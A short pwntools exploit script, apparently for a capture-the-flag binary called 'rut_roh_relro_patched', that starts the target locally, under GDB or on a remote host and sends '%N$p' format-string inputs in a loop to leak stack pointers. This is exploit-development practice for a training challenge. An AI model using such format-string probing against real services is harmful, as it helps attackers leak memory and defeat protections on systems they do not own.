from pwn import *
from warnings import filterwarnings

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
piebase
continue
'''.format(**locals())


# Set up pwntools for the correct architecture
exe = './rut_roh_relro_patched'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'warning'
filterwarnings("ignore")

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

for i in range(100):
    try:
        p = start()
        p.recvuntil('?')
        # Format the counter
        # e.g. %2$s will attempt to print [i]th pointer/string/hex/char/int
        p.sendline('%{}$p'.format(i).encode())
        p.recvuntil(':')
        p.recvline()
        result = p.recvline()
        print(str(i) + ': ' + str(result))
        p.close()
    except EOFError:
        pass
